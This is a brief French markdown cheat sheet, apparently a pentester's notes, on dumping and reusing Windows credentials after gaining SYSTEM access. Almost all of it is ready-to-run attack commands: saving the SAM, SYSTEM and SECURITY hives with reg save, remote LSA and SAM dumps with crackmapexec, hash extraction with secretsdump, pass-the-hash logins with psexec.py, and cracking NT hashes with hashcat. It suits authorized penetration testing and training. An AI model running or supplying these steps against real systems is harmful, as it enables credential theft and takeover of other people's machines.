---
public: true # set to true to make the article publishable
---

## Dump des credentials quand on est system

### Localement
```
reg save hklm\sam sam.save
reg save hklm\system system.save
reg save hklm\security security.save
```

### A distance 

```
crackmapexec smb $TARGET_IP --local-auth -u $LOCAL_USER -p $LOCAL_PASS --lsa
crackmapexec smb $TARGET_IP --local-auth -u $LOCAL_USER -p $LOCAL_PASS --sam
```

## Extraction des Hashs
```
secretdump.py local -sam sam.save -security security.save -system system.save LOCAL
```

## Utilisation des Hash LM:NT
### Accès distant
``` shell 
psexec.py Administratur@$TARGET_IP -hashes xxxxxxxxxxxxxxxxx:xxxxxxxxxxxxxxxxxxxxxxx
# ou
psexec.py Administratur@$TARGET_IP -hashes :xxxxxxxxxxxxxxxxxxxxxxx
```

### Cassage des hashs avec hashcat

```
cat hash.txt
64f12cddaa88057e06a81b54e73b949b
31d6cfe0d16ae931b73c59d7e0c089c0
...

sudo hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
```
